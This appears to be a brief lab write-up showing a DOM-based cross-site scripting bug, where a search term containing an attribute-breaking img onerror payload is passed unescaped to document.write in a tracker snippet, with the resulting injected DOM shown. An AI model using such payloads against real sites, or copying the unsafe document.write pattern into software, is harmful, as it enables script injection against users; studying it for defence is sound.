Searching for 
```
bla"><img src=1 onerror="alert(1)
```
causes
```
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```
to add
```
<img src="/resources/images/tracker.gif?searchTerms=bla" qy2juxwkj=""><img src="1" onerror="alert(1)">
```
to the DOM
